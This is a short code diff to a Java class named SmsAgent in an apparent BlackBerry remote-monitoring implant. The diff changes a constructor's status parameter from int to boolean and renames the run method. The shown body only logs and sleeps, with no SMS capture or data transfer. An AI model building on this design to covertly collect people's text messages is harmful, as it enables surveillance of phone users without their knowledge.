@@ -6,16 +6,16 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class SmsAgent extends Agent {
     static Debug debug = new Debug("SmsAgent", DebugLevel.VERBOSE);
 
-    public SmsAgent(int agentStatus) {
+    public SmsAgent(boolean agentStatus) {
         super(AGENT_SMS, agentStatus, true);
     }
 
-    protected SmsAgent(int agentStatus, byte[] confParams) {
+    protected SmsAgent(boolean agentStatus, byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
 
-    public void agentRun() {
+    public void actualRun() {
         debug.trace("run");
         this.sleepUntilStopped();
 
